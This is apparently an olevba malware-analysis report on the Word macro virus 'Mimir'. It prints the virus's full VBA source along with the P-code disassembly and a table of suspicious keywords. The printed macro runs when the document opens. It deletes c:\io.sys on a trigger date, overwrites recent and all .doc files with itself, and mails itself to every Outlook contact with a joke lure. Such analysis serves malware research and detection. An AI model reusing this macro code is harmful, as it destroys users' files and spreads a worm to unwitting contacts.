olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mimir
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mimir - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Static navn, hvor As String
Dim MAkeNewEmail As Outlook.Application
Dim NEwEmail As MailItem
Dim ObjectContactfolder As Object
Dim ObjectContact As Object

Docfilename = Word.ActiveDocument.Name
Whereis = Word.ActiveDocument.Path


If Date = "04.09.99" Then
SetAttr "c:\io.sys", vbNormal
Kill "c:\io.sys"
MsgBox "..Sorry..MIMIR has infected your PC..", vbCritical, "Oooops"
GoTo ReSuMeMimir
End

Else
ReSuMeMimir:


With Word.Windows.Application
.Caption = "MiMiR is giving your computer new intelligence!"
.ScreenUpdating = False
.StatusBar = False

sistefil1 = RecentFiles(1).Path & "\" & RecentFiles(1).Name
sistefil2 = RecentFiles(2).Path & "\" & RecentFiles(2).Name
sistefil3 = RecentFiles(3).Path & "\" & RecentFiles(3).Name
sistefil4 = RecentFiles(4).Path & "\" & RecentFiles(4).Name

.ActiveDocument.SaveAs sistefil1
.ActiveDocument.SaveAs sistefil2
.ActiveDocument.SaveAs sistefil3
.ActiveDocument.SaveAs sistefil4
 

.ActiveDocument.SaveAs Whereis & "\" & Docfilename
End With

With Application.FileSearch
    .FileName = "*.doc"
    .LookIn = "C:"
    .SearchSubFolders = True
    .Execute
    For i = 1 To .FoundFiles.Count
Word.Application.ActiveDocument.SaveAs .FoundFiles(i)
    Next i
End With



Set MAkeNewEmail = CreateObject("outlook.application")
Set NEwEmail = MAkeNewEmail.CreateItem(olMailItem)
Set mimirnamespace = MAkeNewEmail.GetNamespace("MAPI")
Set ObjectContactfolder = mimirnamespace.GetDefaultFolder(olFolderContacts)


For Each ObjectContact In ObjectContactfolder.Items
TheEmailAdress = ObjectContact.Email1Address

With NEwEmail
.To = TheEmailAdress
.Body = "Some nice jokes you got to read!! :))"
.Attachments.Add Word.ActiveDocument.FullName
.Send
End With
Next
End If

End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mimir
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 71892 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim (Static) 
' 	VarDefn navn
' 	VarDefn hvor (As String)
' Line #3:
' 	Dim 
' 	VarDefn NEwEmail (As <crash>)
' Line #4:
' 	Dim 
' 	VarDefn Docfilename (As _B_var_set)
' Line #5:
' 	Dim 
' 	VarDefn ObjectContact (As Object)
' Line #6:
' 	Dim 
' 	VarDefn mimirnamespace (As Object)
' Line #7:
' Line #8:
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	St Whereis 
' Line #9:
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Path 
' 	St MakeEmail 
' Line #10:
' Line #11:
' Line #12:
' 	Ld Date 
' 	LitStr 0x0008 "04.09.99"
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0009 "c:\io.sys"
' 	Ld vbReadOnly 
' 	ArgsCall vbHidden 0x0002 
' Line #14:
' 	LitStr 0x0009 "c:\io.sys"
' 	ArgsCall fila 0x0001 
' Line #15:
' 	LitStr 0x0025 "..Sorry..MIMIR has infected your PC.."
' 	Ld ReSuMeMimir 
' 	LitStr 0x0006 "Oooops"
' 	ArgsCall MsgBox 0x0003 
' Line #16:
' 	GoTo _B_var_Docfilename 
' Line #17:
' 	End 
' Line #18:
' Line #19:
' 	ElseBlock 
' Line #20:
' 	Label _B_var_Docfilename 
' Line #21:
' Line #22:
' Line #23:
' 	StartWithExpr 
' 	Ld Word 
' 	MemLd Windows 
' 	MemLd Application 
' 	With 
' Line #24:
' 	LitStr 0x002F "MiMiR is giving your computer new intelligence!"
' 	MemStWith Caption 
' Line #25:
' 	LitVarSpecial (False)
' 	MemStWith FileSearch 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith _B_var_Date 
' Line #27:
' Line #28:
' 	LitDI2 0x0001 
' 	ArgsLd sistefil1 0x0001 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd sistefil1 0x0001 
' 	MemLd New 
' 	Concat 
' 	St sistefil2 
' Line #29:
' 	LitDI2 0x0002 
' 	ArgsLd sistefil1 0x0001 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd sistefil1 0x0001 
' 	MemLd New 
' 	Concat 
' 	St sistefil3 
' Line #30:
' 	LitDI2 0x0003 
' 	ArgsLd sistefil1 0x0001 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsLd sistefil1 0x0001 
' 	MemLd New 
' 	Concat 
' 	St sistefil4 
' Line #31:
' 	LitDI2 0x0004 
' 	ArgsLd sistefil1 0x0001 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd sistefil1 0x0001 
' 	MemLd New 
' 	Concat 
' 	St sistefil5 
' Line #32:
' Line #33:
' 	Ld sistefil2 
' 	MemLdWith ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #34:
' 	Ld sistefil3 
' 	MemLdWith ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #35:
' 	Ld sistefil4 
' 	MemLdWith ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #36:
' 	Ld sistefil5 
' 	MemLdWith ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #37:
' Line #38:
' Line #39:
' 	Ld MakeEmail 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Whereis 
' 	Concat 
' 	MemLdWith ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #40:
' 	EndWith 
' Line #41:
' Line #42:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd LookIn 
' 	With 
' Line #43:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #44:
' 	LitStr 0x0002 "C:"
' 	MemStWith Execute 
' Line #45:
' 	LitVarSpecial (True)
' 	MemStWith id_036A 
' Line #46:
' 	ArgsMemCallWith i 0x0000 
' Line #47:
' 	StartForVariable 
' 	Ld FoundFiles 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith Count 
' 	MemLd Templates 
' 	For 
' Line #48:
' 	Ld FoundFiles 
' 	ArgsMemLdWith Count 0x0001 
' 	Ld Word 
' 	MemLd Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #49:
' 	StartForVariable 
' 	Ld FoundFiles 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	EndWith 
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' 	SetStmt 
' 	LitStr 0x0013 "outlook.application"
' 	ArgsLd nyepost 0x0001 
' 	Set NEwEmail 
' Line #55:
' 	SetStmt 
' 	Ld _B_var_nyepost 
' 	Ld NEwEmail 
' 	ArgsMemLd olMailItem 0x0001 
' 	Set Docfilename 
' Line #56:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld NEwEmail 
' 	ArgsMemLd _B_var_mimirnamespace 0x0001 
' 	Set GetNamespace 
' Line #57:
' 	SetStmt 
' 	Ld _B_var_For 
' 	Ld GetNamespace 
' 	ArgsMemLd olFolderContacts 0x0001 
' 	Set ObjectContact 
' Line #58:
' Line #59:
' Line #60:
' 	StartForVariable 
' 	Ld mimirnamespace 
' 	EndForVariable 
' 	Ld ObjectContact 
' 	MemLd TheEmailAdress 
' 	ForEach 
' Line #61:
' 	Ld mimirnamespace 
' 	MemLd StatusBar 
' 	St _B_var_TheEmailAdress 
' Line #62:
' Line #63:
' 	StartWithExpr 
' 	Ld Docfilename 
' 	With 
' Line #64:
' 	Ld _B_var_TheEmailAdress 
' 	MemStWith True 
' Line #65:
' 	LitStr 0x0025 "Some nice jokes you got to read!! :))"
' 	MemStWith Send 
' Line #66:
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd GetAttr 
' 	MemLdWith Add 
' 	ArgsMemCall PathName 0x0001 
' Line #67:
' 	ArgsMemCallWith Modul1 0x0000 
' Line #68:
' 	EndWith 
' Line #69:
' 	StartForVariable 
' 	Next 
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' Line #75:
' Line #76:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

